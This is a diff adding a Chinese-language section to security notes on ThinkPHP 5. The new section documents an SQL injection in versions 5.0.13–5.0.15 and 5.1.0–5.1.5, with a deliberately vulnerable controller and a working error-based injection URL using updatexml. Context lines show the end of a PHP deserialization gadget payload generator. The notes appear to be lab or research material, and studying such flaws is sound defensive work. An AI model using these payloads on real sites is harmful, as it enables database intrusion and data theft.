@@ -196,3 +196,29 @@ use think\process\pipes\Windows;
 echo base64_encode(serialize(new Windows()));
 ?>
 ```
+
+
+^
+## **Thinkphp5 sql注入测试**
+**5.0.13<=ThinkPHP<=5.0.15** 
+ **5.1.0<=ThinkPHP<=5.1.5** 
+
+application/index/controller/Index.php手动修改如下：
+```
+<?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $username = request()->get('username/a');
+        db('users')->insert(['username' => $username]);
+        return 'Update success';
+    }
+}
+```
+insert是直接替换的字符串，使用如下触发sql注入
+```
+/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
+```
